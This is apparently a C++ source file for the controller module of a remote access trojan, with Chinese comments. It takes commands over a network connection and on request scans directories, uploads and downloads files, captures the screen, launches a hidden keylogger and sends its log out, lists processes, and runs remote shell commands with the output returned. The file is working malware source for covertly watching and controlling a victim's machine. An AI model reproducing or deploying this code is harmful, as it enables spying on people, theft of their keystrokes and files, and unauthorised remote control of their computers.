#include "Config.h"
#include "Global.h"
#include "Controller.h"

using namespace std;

Controller::Controller()
{
	initializeError = false;
	working = true;
	if (ns.initializeError)
	{
		initializeError = true;
	}
	if (WORKMODE == 1)	// 被动连接，ns进入监听
	{
		if (!ns.WaitConnect())
		{
			initializeError = true;
		}
		// else init_success
	}
	else if (WORKMODE == 2)	// 主动连接，ns尝试连接
	{
		if (!ns.Connect2Client())
		{
			initializeError = true;
		}
		cout << "Connect" << endl;
	}
}

bool Controller::RecvCmd()
{
	if (!ns.ReceiveData())
	{
		return false;
	}
	// cout << recvBuffer << endl;
	return true;
}

bool Controller::ExecCmd()
{
	bool retValue = true;
	if (!strcmp(recvBuffer, "hello"))
	{
		// NOP, retValue = true;
	}
	else if (!strcmp(recvBuffer, "scan"))
	{
		retValue = RecvCmd();
		if (retValue)	// 成功接收扫描路径
		{
			retValue = fm.FileScan(recvBuffer);
			if (retValue)	// 成功扫描
			{
				/*char sendBuffer[SIZE];
				memset(sendBuffer, 0, sizeof(sendBuffer));*/
				ofstream tmpFile;
				char tmpFilePath[40];
				strcpy(tmpFilePath, "G:\\skjdkhfkqu87823ehksdzsaldk.txt");
				tmpFile.open(tmpFilePath);
				if (!tmpFile)
				{
					retValue = false;
				}
				for (vector<string>::iterator iter = directoryScanResult.begin(); iter != directoryScanResult.end(); ++iter)
				{
					tmpFile.write(((*iter) + " [directory] \n").c_str(), ((*iter) + " [directory] \n").length());
				}
				for (vector<string>::iterator iter = fileScanResult.begin(); iter != fileScanResult.end(); ++iter)
				{
					tmpFile.write(((*iter) + " [file] \n").c_str(), ((*iter) + " [file] \n").length());
				}
				tmpFile.close();	// 先关闭文件再发送
				retValue = ns.SendFile(tmpFilePath);		// 发送结果即为执行结果
				fm.FileDelete(tmpFilePath);
			}
		}
	}
	else if (!strcmp(recvBuffer, "upload"))
	{
		retValue = RecvCmd();
		if (retValue)
		{
			char filePath[666];
			strcpy(filePath, recvBuffer);
			retValue = ns.ReceiveFile(filePath);
		}
	}
	else if (!strcmp(recvBuffer, "download"))
	{
		retValue = RecvCmd();
		if (retValue)
		{
			char filePath[666];
			strcpy(filePath, recvBuffer);
			retValue = ns.SendFile(filePath);
		}
	}
	else if (!strcmp(recvBuffer, "screen"))     //屏幕监听
	{
		retValue = sc.Shot();
		sc.MakeZip();
		char tmpFilePath[40];
		strcpy(tmpFilePath, "G:\\test.zip");
		retValue = ns.SendFile(tmpFilePath);
		fm.FileDelete(tmpFilePath);
	}
	else if (!strcmp(recvBuffer, "monitor_on"))            //收到开启键盘监听指令
	{
		WinExec("keyboard.exe", SW_HIDE);      // 开启keyboard进程
	}
	else if (!strcmp(recvBuffer, "monitor_off"))
	{
		system("TASKKILL /F /IM keyboard.exe");    //关闭keyboard进程
		char filePath[40];
		strcpy(filePath, "F:\\keylog.txt");           //发送keylog文件
		retValue = ns.SendFile(filePath);
		fm.FileDelete(filePath);

	}
	else if (!strcmp(recvBuffer, "process"))               //进程扫描程序
	{
		system("EnumProcess_Test.exe");
		char filePath[40];
		strcpy(filePath, "F:\\log.txt");
		retValue = ns.SendFile(filePath);
	}
	else if (!strcmp(recvBuffer, "quit"))
	{
		retValue = ns.Clear();
		working = false;
	}
	else if (!strcmp(recvBuffer, "shell"))
	{
		string strRet;
		retValue = ns.ReceiveData();
		if (retValue)	// 成功接受指令
		{
			strRet = sh.eval(recvBuffer);
			if (strRet.length())
			{
				cout << strRet << endl;
				retValue = ns.SendData(strRet.c_str(), strRet.length());
			}
			else
			{
				retValue = ns.SendData("No result.", 11);
			}
		}
	}
	else
	{
		// NOP
	}

	return retValue;
}

void Controller::Close()
{
	ns.Clear();
}
